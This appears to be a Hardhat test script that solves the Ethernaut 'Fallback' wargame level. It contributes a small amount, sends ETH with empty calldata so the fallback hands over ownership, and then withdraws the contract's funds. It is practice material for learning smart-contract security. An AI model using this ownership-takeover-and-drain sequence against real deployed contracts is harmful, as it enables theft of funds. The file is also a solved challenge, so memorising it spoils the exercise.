import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Fallback`);
  const challengeAddress = await createChallenge(
    `0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  console.log(await eoa.getAddress())
  console.log((await eoa.getBalance()).toString())
  
  await challenge.connect(eoa).contribute({value:1})
  console.log((await challenge.connect(eoa).getContribution()).toString())
  
  await eoa.sendTransaction({to:challenge.address, data:"0x", value:1}) // empty calldata -> fallback

  await challenge.connect(eoa).withdraw()

  console.log(await challenge.owner())

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
